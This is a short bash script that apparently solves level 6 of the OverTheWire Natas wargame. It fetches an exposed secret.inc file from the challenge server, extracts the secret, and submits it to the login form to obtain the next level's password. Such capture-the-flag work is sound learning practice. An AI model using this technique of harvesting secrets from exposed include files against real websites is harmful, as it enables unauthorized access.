#!/bin/bash

secret=$(curl -u natas6:$(cat keys/seis) http://natas6.natas.labs.overthewire.org/includes/secret.inc 2> /dev/null | grep secret | cut -d'"' -f2)

curl -u natas6:$(cat keys/seis) -X POST -F "secret=$secret" -F 'submit=submit' http://natas6.natas.labs.overthewire.org/ 2>/dev/null | grep natas7

